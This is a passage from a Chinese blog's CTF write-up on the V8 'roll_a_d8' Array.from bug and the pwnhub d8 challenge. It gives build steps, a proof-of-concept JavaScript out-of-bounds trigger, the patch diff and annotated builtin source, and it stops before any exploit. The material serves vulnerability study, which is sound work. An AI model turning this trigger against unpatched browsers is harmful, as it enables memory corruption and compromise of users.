@@ -1,0 +1,853 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+  <meta name="google-site-verification" content="n74fzVGuzCcR7QhYWu-qaPH7lKOjZC3b3tDU0egKMNA" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.3" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.3">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.3">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.3" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="browser,v8," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="已经有很长一段时间没有调东西了，这两天看了看v8相关的内容，调了之前pwnhub出现的一道v8相关的题。（ps：很久没做题现在都不会做了） 其实我是先看了几篇关于roll-a-d8的文章，把这个漏洞分析了一下，没打算写exp的，后来准备做pwnhub-d8的时候发现可以用这个洞来打，所以写了exp记录一下！关于roll-a-d8的文章在这里，师傅们写的很详细了： roll_a_d8-v8利用学习">
+<meta name="keywords" content="browser,v8">
+<meta property="og:type" content="article">
+<meta property="og:title" content="roll_a_d8 &amp;&amp; pwnhub d8题解">
+<meta property="og:url" content="https://e3pem.github.io/2020/03/06/browser/pwnhub-d8/index.html">
+<meta property="og:site_name" content="e3pem&#39;s Blog">
+<meta property="og:description" content="已经有很长一段时间没有调东西了，这两天看了看v8相关的内容，调了之前pwnhub出现的一道v8相关的题。（ps：很久没做题现在都不会做了） 其实我是先看了几篇关于roll-a-d8的文章，把这个漏洞分析了一下，没打算写exp的，后来准备做pwnhub-d8的时候发现可以用这个洞来打，所以写了exp记录一下！关于roll-a-d8的文章在这里，师傅们写的很详细了： roll_a_d8-v8利用学习">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200306145252.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200306162736.png">
+<meta property="og:updated_time" content="2020-03-06T09:40:17.580Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="roll_a_d8 &amp;&amp; pwnhub d8题解">
+<meta name="twitter:description" content="已经有很长一段时间没有调东西了，这两天看了看v8相关的内容，调了之前pwnhub出现的一道v8相关的题。（ps：很久没做题现在都不会做了） 其实我是先看了几篇关于roll-a-d8的文章，把这个漏洞分析了一下，没打算写exp的，后来准备做pwnhub-d8的时候发现可以用这个洞来打，所以写了exp记录一下！关于roll-a-d8的文章在这里，师傅们写的很详细了： roll_a_d8-v8利用学习">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/e3pem/mdimage/master/img/20200306145252.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.3',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://e3pem.github.io/2020/03/06/browser/pwnhub-d8/"/>
+
+
+
+
+
+  <title>roll_a_d8 && pwnhub d8题解 | e3pem's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">e3pem's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://e3pem.github.io/2020/03/06/browser/pwnhub-d8/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="e3pem">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="e3pem's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">roll_a_d8 && pwnhub d8题解</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-06T12:00:00+08:00">
+                2020-03-06
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p>已经有很长一段时间没有调东西了，这两天看了看v8相关的内容，调了之前pwnhub出现的一道v8相关的题。（ps：很久没做题现在都不会做了）</p>
+<p>其实我是先看了几篇关于<code>roll-a-d8</code>的文章，把这个漏洞分析了一下，没打算写exp的，后来准备做<code>pwnhub-d8</code>的时候发现可以用这个洞来打，所以写了exp记录一下！关于<code>roll-a-d8</code>的文章在这里，师傅们写的很详细了：</p>
+<p><a href="http://dittozzz.top/2019/07/02/roll-a-d8-v8%E5%88%A9%E7%94%A8%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">roll_a_d8-v8利用学习</a></p>
+<p><a href="https://www.anquanke.com/post/id/147829" target="_blank" rel="noopener">扔个骰子学v8 - 从Plaid CTF roll a d8开始</a></p>
+<p><a href="https://xz.aliyun.com/t/5190" target="_blank" rel="noopener">v8 exploit入门[PlaidCTF roll a d8]</a></p>
+<h2 id="初步分析"><a href="#初步分析" class="headerlink" title="初步分析"></a>初步分析</h2><p>题目给出的文件内容如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">编译命令</span><br><span class="line">git clone https://chromium.googlesource.com/v8/v8.git</span><br><span class="line">git checkout (before Mar 7, 2018)</span><br><span class="line">cd v8 &amp; gclient sync</span><br><span class="line">python tools/dev/v8gen.py -b ia32.release ia32.release</span><br><span class="line">ninja -C out.gn/ia32.release d8</span><br></pre></td></tr></table></figure></p>
+<p>根据其中的<code>before Mar 7 2018</code>，猜测只需要找这之后发现的漏洞，应该就可以利用成功了（之前走入了找这天修补了什么漏洞的误区）。关键是怎么找这些可以用的漏洞呢？</p>
+<p>我最开始是在git的所有日志里面搜索与<code>OOB</code>有关的commit，这道题可以采用<code>roll-a-d8</code>的洞来打也是这样搜出来的。然而还有更好的方法，可以在<a href="https://bugs.chromium.org/p/chromium/issues/list" target="_blank" rel="noopener">chrome的issue列表</a>进行搜索，搜索的关键字就为<code>OOB</code>，主要是因为OOB从利用上来讲会容易一些。会搜出来很多漏洞，从里面选择漏洞来尝试即可。</p>
+<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>漏洞的详情在<a href="https://bugs.chromium.org/p/chromium/issues/detail?id=821137" target="_blank" rel="noopener">这里</a>。在<a href="https://chromium.googlesource.com/v8/v8.git/+/b5da57a06de8791693c248b7aafc734861a3785d" target="_blank" rel="noopener">这个链接</a>里面找到了存在漏洞版本的commitid、diff以及poc。</p>
+<h3 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h3><p>首先分析一下poc：<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> oobArray = [];</span><br><span class="line"><span class="keyword">let</span> maxSize = <span class="number">1028</span> * <span class="number">8</span>;</span><br><span class="line"><span class="built_in">Array</span>.from.call(<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123; <span class="keyword">return</span> oobArray &#125;, &#123;[<span class="built_in">Symbol</span>.iterator] : <span class="function"><span class="params">_</span> =&gt;</span> (</span><br><span class="line">  &#123;</span><br><span class="line">    counter : <span class="number">0</span>,</span><br><span class="line">    next() &#123;</span><br><span class="line">      <span class="keyword">let</span> result = <span class="keyword">this</span>.counter++;</span><br><span class="line">      <span class="keyword">if</span> (<span class="keyword">this</span>.counter &gt; maxSize) &#123;</span><br><span class="line">        oobArray.length = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">done</span>: <span class="literal">true</span>&#125;;</span><br><span class="line">      &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="attr">value</span>: result, <span class="attr">done</span>: <span class="literal">false</span>&#125;;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">) &#125;);</span><br><span class="line">oobArray[oobArray.length - <span class="number">1</span>] = <span class="number">0x41414141</span>;</span><br></pre></td></tr></table></figure></p>
+<p>分配了一个oobArray，然后调用了Array.from函数，查了一下该函数：</p>
+<pre><code>Array.from() 方法从一个类似数组或可迭代对象创建一个新的，浅拷贝的数组实例。
+</code></pre><p>这里传递给Array.from的参数就是一个可迭代对象，而且给对象的<code>Symbol.iterator</code>赋了值，标识这个对象是可迭代的。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">在 ES6 中常用的集合对象（数组、Set/Map集合）和字符串都是可迭代对象，这些对象都有默认的迭代器和Symbol.iterator属性。</span><br><span class="line"></span><br><span class="line">可迭代对象具有Symbol.iterator属性，即具有Symbol.iterator属性的对象都有默认迭代器。</span><br><span class="line"></span><br><span class="line">通过给Symbol.iterator属性添加一个生成器可以将自定义对象变成可迭代对象。</span><br></pre></td></tr></table></figure>
+<p>next函数就是每次迭代中要调用到的函数，该函数在最后一次迭代的时候把oobArray的length设置成了0。然后往数组中的<code>oobArray.length-1</code>处赋值就导致了程序崩溃。</p>
+<h3 id="源码分析"><a href="#源码分析" class="headerlink" title="源码分析"></a>源码分析</h3><p>有了崩溃的产生，那么崩溃是如何产生的呢？正常情况下<code>oobArray-1</code>还是处于数组自己的空间内，不应该出错。</p>
+<p>这里看一下diff文件，可以发现仅对GenerateSetLength进行了patch，将其中调用的<code>SmiLessThan</code>换成了<code>SmiNotEqual</code>。查看注释，如果新创建的数组的原本的长度大于预期的，就进入到运行时，来对数组进行收缩。从<code>预期长度小于原来长度则进入runtime</code>改为了<code>预期长度和原来长度不一致则进入runtime</code>。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">void</span> GenerateSetLength(TNode&lt;Context&gt; context, TNode&lt;<span class="built_in">Object</span>&gt; array,</span><br><span class="line">                          TNode&lt;<span class="built_in">Number</span>&gt; length) &#123;</span><br><span class="line">     Label fast(<span class="keyword">this</span>), runtime(<span class="keyword">this</span>), done(<span class="keyword">this</span>);</span><br><span class="line">+    <span class="comment">// TODO(delphick): We should be able to skip the fast set altogether, if the</span></span><br><span class="line">+    <span class="comment">// length already equals the expected length, which it always is now on the</span></span><br><span class="line">+    <span class="comment">// fast path.</span></span><br><span class="line">     <span class="comment">// Only set the length in this stub if</span></span><br><span class="line">     <span class="comment">// 1) the array has fast elements,</span></span><br><span class="line">     <span class="comment">// 2) the length is writable,</span></span><br><span class="line">-    <span class="comment">// 3) the new length is greater than or equal to the old length.</span></span><br><span class="line">+    <span class="comment">// 3) the new length is equal to the old length.</span></span><br><span class="line"> </span><br><span class="line">     <span class="comment">// 1) Check that the array has fast elements.</span></span><br><span class="line">     <span class="comment">// TODO(delphick): Consider changing this since it does an an unnecessary</span></span><br><span class="line">@@ <span class="number">-1970</span>,<span class="number">10</span> +<span class="number">1973</span>,<span class="number">10</span> @@</span><br><span class="line">       <span class="comment">// BranchIfFastJSArray above.</span></span><br><span class="line">       EnsureArrayLengthWritable(LoadMap(fast_array), &amp;runtime);</span><br><span class="line"> </span><br><span class="line">-      <span class="comment">// 3) If the created array already has a length greater than required,</span></span><br><span class="line">+      <span class="comment">// 3) If the created array's length does not match the required length,</span></span><br><span class="line">       <span class="comment">//    then use the runtime to set the property as that will insert holes</span></span><br><span class="line">-      <span class="comment">//    into the excess elements and/or shrink the backing store.</span></span><br><span class="line">-      GotoIf(SmiLessThan(length_smi, old_length), &amp;runtime);</span><br><span class="line">+      <span class="comment">//    into excess elements or shrink the backing store as appropriate.</span></span><br><span class="line">+      GotoIf(SmiNotEqual(length_smi, old_length), &amp;runtime);</span><br><span class="line"> </span><br><span class="line">       StoreObjectFieldNoWriteBarrier(fast_array, <span class="attr">JSArray</span>::kLengthOffset,</span><br><span class="line">                                      length_smi);</span><br></pre></td></tr></table></figure>
+<p>所以问题就出在这个地方，再查看一下调用了GenerateSetLength的地方，也就是Array.from实现的地方：</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ES #sec-array.from</span></span><br><span class="line">TF_BUILTIN(ArrayFrom, ArrayPopulatorAssembler) &#123;</span><br><span class="line">  TNode&lt;Context&gt; context = CAST(Parameter(BuiltinDescriptor::kContext));</span><br><span class="line">  TNode&lt;Int32T&gt; argc =</span><br><span class="line">      UncheckedCast&lt;Int32T&gt;(Parameter(BuiltinDescriptor::kArgumentsCount));</span><br><span class="line"><span class="comment">// 获取参数列表</span></span><br><span class="line">  CodeStubArguments args(this, ChangeInt32ToIntPtr(argc));</span><br><span class="line"></span><br><span class="line">  TNode&lt;Object&gt; map_function = args.GetOptionalArgumentValue(<span class="number">1</span>);</span><br><span class="line"><span class="comment">// 检测map_function是不是未定义或者是不能调用</span></span><br><span class="line">  <span class="comment">// If map_function is not undefined, then ensure it's callable else throw.</span></span><br><span class="line">  &#123;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  Label iterable(this), not_iterable(this), finished(this), if_exception(this);</span><br><span class="line"></span><br><span class="line">  TNode&lt;Object&gt; this_arg = args.GetOptionalArgumentValue(<span class="number">2</span>);</span><br><span class="line"><span class="comment">//   从后面的分析来看items对应的是Array.from的第二个参数，但是他的idx却是0?</span></span><br><span class="line"><span class="comment">// 所以猜测顺序是从后往前算的</span></span><br><span class="line">  TNode&lt;Object&gt; items = args.GetOptionalArgumentValue(<span class="number">0</span>);</span><br><span class="line">  <span class="comment">// The spec doesn't require ToObject to be called directly on the iterable</span></span><br><span class="line">  <span class="comment">// branch, but it's part of GetMethod that is in the spec.</span></span><br><span class="line"><span class="comment">//   将items变成arraylike</span></span><br><span class="line">  TNode&lt;JSReceiver&gt; array_like = ToObject(context, items);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义两个变量，array、length</span></span><br><span class="line">  TVARIABLE(Object, <span class="built_in">array</span>);</span><br><span class="line">  TVARIABLE(Number, length);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Determine whether items[Symbol.iterator] is defined:</span></span><br><span class="line">  IteratorBuiltinsAssembler iterator_assembler(state());</span><br><span class="line">  Node* iterator_method =</span><br><span class="line">      iterator_assembler.GetIteratorMethod(context, array_like);</span><br><span class="line">  Branch(IsNullOrUndefined(iterator_method), &amp;not_iterable, &amp;iterable);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如何是可迭代的</span></span><br><span class="line">  BIND(&amp;iterable);</span><br><span class="line">  &#123;</span><br><span class="line">    TVARIABLE(Number, index, SmiConstant(<span class="number">0</span>));</span><br><span class="line">    TVARIABLE(Object, var_exception);</span><br><span class="line">    Label loop(this, &amp;index), loop_done(this),</span><br><span class="line">        on_exception(<span class="keyword">this</span>, Label::kDeferred),</span><br><span class="line">        index_overflow(<span class="keyword">this</span>, Label::kDeferred);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Check that the method is callable.</span></span><br><span class="line">    <span class="comment">// 检测是否可调用</span></span><br><span class="line">    &#123;</span><br><span class="line">      ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Construct the output array with empty length.</span></span><br><span class="line">    <span class="comment">// 生成一个空数组，用来存放迭代输出的内容</span></span><br><span class="line">    <span class="built_in">array</span> = ConstructArrayLike(context, args.GetReceiver());</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Actually get the iterator and throw if the iterator method does not yield</span></span><br><span class="line">    <span class="comment">// one.</span></span><br><span class="line">    IteratorRecord iterator_record =</span><br><span class="line">        iterator_assembler.GetIterator(context, items, iterator_method);</span><br><span class="line"></span><br><span class="line">    TNode&lt;Context&gt; native_context = LoadNativeContext(context);</span><br><span class="line">    TNode&lt;Object&gt; fast_iterator_result_map =</span><br><span class="line">        LoadContextElement(native_context, Context::ITERATOR_RESULT_MAP_INDEX);</span><br><span class="line"></span><br><span class="line">    Goto(&amp;loop);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 开始循环迭代</span></span><br><span class="line">    BIND(&amp;loop);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Loop while iterator is not done.</span></span><br><span class="line">      TNode&lt;Object&gt; next = CAST(iterator_assembler.IteratorStep(</span><br><span class="line">          context, iterator_record, &amp;loop_done, fast_iterator_result_map));</span><br><span class="line">      TVARIABLE(Object, value,</span><br><span class="line">                CAST(iterator_assembler.IteratorValue(</span><br><span class="line">                    context, next, fast_iterator_result_map)));</span><br><span class="line"></span><br><span class="line">      <span class="comment">// If a map_function is supplied then call it (using this_arg as</span></span><br><span class="line">      <span class="comment">// receiver), on the value returned from the iterator. Exceptions are</span></span><br><span class="line">      <span class="comment">// caught so the iterator can be closed.</span></span><br><span class="line">      &#123;</span><br><span class="line">        <span class="function">Label <span class="title">next</span><span class="params">(<span class="keyword">this</span>)</span></span>;</span><br><span class="line">        GotoIf(IsUndefined(map_function), &amp;next);</span><br><span class="line"></span><br><span class="line">        CSA_ASSERT(<span class="keyword">this</span>, IsCallable(map_function));</span><br><span class="line">        Node* v = CallJS(CodeFactory::Call(isolate()), context, map_function,</span><br><span class="line">                         this_arg, value.value(), index.value());</span><br><span class="line">        GotoIfException(v, &amp;on_exception, &amp;var_exception);</span><br><span class="line">        <span class="comment">// 获取到值</span></span><br><span class="line">        value = CAST(v);</span><br><span class="line">        Goto(&amp;next);</span><br><span class="line">        BIND(&amp;next);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">// Store the result in the output object (catching any exceptions so the</span></span><br><span class="line">      <span class="comment">// iterator can be closed).</span></span><br><span class="line">    <span class="comment">//   把获取到的值写入到数组里面</span></span><br><span class="line">      Node* define_status =</span><br><span class="line">          CallRuntime(Runtime::kCreateDataProperty, context, <span class="built_in">array</span>.value(),</span><br><span class="line">                      index.value(), value.value());</span><br><span class="line">      GotoIfException(define_status, &amp;on_exception, &amp;var_exception);</span><br><span class="line">    <span class="comment">// 将index的值增加1</span></span><br><span class="line">      index = NumberInc(index.value());</span><br><span class="line"></span><br><span class="line">      <span class="comment">// The spec requires that we throw an exception if index reaches 2^53-1,</span></span><br><span class="line">      <span class="comment">// but an empty loop would take &gt;100 days to do this many iterations. To</span></span><br><span class="line">      <span class="comment">// actually run for that long would require an iterator that never set</span></span><br><span class="line">      <span class="comment">// done to true and a target array which somehow never ran out of memory,</span></span><br><span class="line">      <span class="comment">// e.g. a proxy that discarded the values. Ignoring this case just means</span></span><br><span class="line">      <span class="comment">// we would repeatedly call CreateDataProperty with index = 2^53.</span></span><br><span class="line">      CSA_ASSERT_BRANCH(<span class="keyword">this</span>, [&amp;](Label* ok, Label* not_ok) &#123;</span><br><span class="line">        BranchIfNumberRelationalComparison(Operation::kLessThan, index.value(),</span><br><span class="line">                                           NumberConstant(kMaxSafeInteger), ok,</span><br><span class="line">                                           not_ok);</span><br><span class="line">      &#125;);</span><br><span class="line">      Goto(&amp;loop);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 循环结束，length的值设置为idx</span></span><br><span class="line">    BIND(&amp;loop_done);</span><br><span class="line">    &#123;</span><br><span class="line">      length = index;</span><br><span class="line">      Goto(&amp;finished);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    BIND(&amp;on_exception);</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// Close the iterator, rethrowing either the passed exception or</span></span><br><span class="line">      <span class="comment">// exceptions thrown during the close.</span></span><br><span class="line">      iterator_assembler.IteratorCloseOnException(context, iterator_record,</span><br><span class="line">                                                  &amp;var_exception);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Since there's no iterator, items cannot be a Fast JS Array.</span></span><br><span class="line"><span class="comment">//   不可迭代的情况</span></span><br><span class="line">  BIND(&amp;not_iterable);</span><br><span class="line">  &#123;</span><br><span class="line">  ...</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  BIND(&amp;finished);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 把index的值作为GenerateSetLength中预期的长度</span></span><br><span class="line">  <span class="comment">// Finally set the length on the output and return it.</span></span><br><span class="line">  GenerateSetLength(context, <span class="built_in">array</span>.value(), length.value());</span><br><span class="line">  args.PopAndReturn(<span class="built_in">array</span>.value());</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>看完这里可能还是体会不到漏洞在哪里，结合poc中的最后一次迭代的操作，把oobArray的长度设置成0了，如果Array.from中的array是<code>新创建</code>出来的话，那么不可能存在这个漏洞，要让漏洞存在，就需要让Array.from中新建的array和我们最开始定义的oobArray是同一个。</p>
